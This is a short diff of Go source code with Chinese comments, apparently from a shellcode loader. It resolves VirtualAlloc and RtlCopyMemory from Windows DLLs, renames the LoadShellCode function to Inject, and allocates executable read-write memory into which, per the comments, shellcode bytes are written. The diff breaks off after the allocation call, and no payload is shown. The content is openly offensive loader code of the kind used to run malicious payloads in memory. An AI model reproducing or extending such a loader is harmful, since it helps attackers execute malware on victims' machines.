@@ -15,13 +15,12 @@ const (
 var (
 	//调用winApi
 	kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用Windows内核
-	ntdll         = syscall.MustLoadDLL("ntdll.dll")      //在内存中保留一块区域
+	ntdll         = syscall.MustLoadDLL("ntdll.dll")      //调用ntdll，进行内存操作
 	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //申请内存空间
 	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //内存块复制
 )
 
-func LoadShellCode(b []byte) {
-
+func Inject(b []byte) {
 	//使用内存操作api开辟一块内存，然后将shellcode的字节流写入
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(b)), MemCommit|MemReserve, PageExecuteReadwrite)
 	if err != nil && err.Error() != "The operation completed successfully." {
